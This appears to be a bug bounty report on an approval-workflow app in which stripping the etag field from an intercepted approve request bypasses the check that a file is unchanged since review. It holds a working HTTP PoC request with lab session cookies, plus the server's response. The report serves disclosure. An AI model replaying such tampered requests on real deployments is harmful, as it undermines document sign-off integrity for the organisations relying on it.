  "vulnerability_information": "## Summary:\nThe approval workflow includes a protection intended to prevent an approver from approving or rejecting a file whose contents changed after review, using the file etag. However, the backend only enforces this check when the etag parameter is present and non-empty. An attacker can intercept the request from the UI, remove the etag field, and successfully approve or reject a file even after it was modified.\n\nThis breaks the integrity of the approval process because the approver may approve a different file state than the one they reviewed.\n##Prerequisites\n\nA valid approval workflow exists.\ntest1 is allowed to request approval.\ntest2 is allowed to approve.\ntest2 has access to the pending file.\n\n## Steps To Reproduce:\n\n1. Create an approval workflow:\n\n{F5551074}\n\n2. Log in as test1 and upload a file such as poc.md\n\n{F5551092}\n\n3. Request approval for that file.\n\n{F5551095}\n\n{F5551096}\n\n4. Log in as test2 and review the file contents.\n\n{F5551101}\n\n5. As test2, click Approve and intercept the request with Burp\n\n{F5551104}\n\n{F5551105}\n\n6. Log back in as test1 and modify the file.\n\n{F5551108}\n\n7. As test2, It is unacceptable when content has just been edited.\n\n{F5551114}\n\n8. As test2, remove the etag field from the JSON body and Forward the request.\nVerified PoC\n```\nPUT /ocs/v2.php/apps/approval/api/v1/approve/14831 HTTP/1.1\nHost: 172.16.88.96:8081\nContent-Length: 19\nrequesttoken: VG7aXKzexiptXUcHCI4D3kSYtm7Ka9qPYV/cPqY98nQ=:PQucC5msr3wlKB5GYd157nHO0RSPIYnGI3SUe/YMkwE=\nX-Requested-With: XMLHttpRequest, XMLHttpRequest\nAccept-Language: vi-VN,vi;q=0.9\nAccept: application/json, text/plain, */*\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36\nOrigin: http://172.16.88.96:8081\nAccept-Encoding: gzip, deflate, br\nCookie: oc_sessionPassphrase=h0hEbFC0ZNEg6Gqy4BzpKCPT9G99atcnoDLkZETROFjdM5pBmz0CGEZiRgeoPI%2BU9qXj9UC6Ayu2TpojCyMA32cLlAj%2Bms9gvLYnViKC%2BhNWO9B0i3rBmR1YewWvEKhj; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; ocrzkzhsljc2=61f75550c287a8d21a3a557dd913e7ca; nc_username=test2; nc_token=a787oSWw0nXxsNOytys1vIoZTGKXsi6d; nc_session_id=61f75550c287a8d21a3a557dd913e7ca\nConnection: keep-alive\n\n{\"message\":\"test2\"}\n```\nObserved response\n```\nHTTP/1.1 200 OK\nDate: Tue, 17 Mar 2026 08:30:21 GMT\nServer: Apache/2.4.66 (Debian)\nX-Content-Type-Options: nosniff\nX-Frame-Options: SAMEORIGIN\nX-Permitted-Cross-Domain-Policies: none\nX-Robots-Tag: noindex, nofollow\nReferrer-Policy: no-referrer\nX-Powered-By: PHP/8.3.30\nContent-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'\nX-Request-Id: 8xMLCrwKUw0gFWKsJVTu\nCache-Control: no-cache, no-store, must-revalidate\nFeature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'\nX-User-Id: test2\nContent-Length: 74\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: application/json; charset=utf-8\n\n{\"ocs\":{\"meta\":{\"status\":\"ok\",\"statuscode\":200,\"message\":\"OK\"},\"data\":[]}}\n```\n\n{F5551125}\n\n## Impact\n\nThis vulnerability allows bypassing the content freshness protection in the approval workflow. In practice, it can lead to:\n\n- Approval of a file version different from the one reviewed\n- Loss of integrity in internal sign-off or approval processes\n- Approval of altered compliance, legal, financial, or release artifacts\n- Abuse by a requester who modifies the file after review but before final approval\nIf this app is used in sensitive approval workflows, the impact may be higher depending on deployment context.",
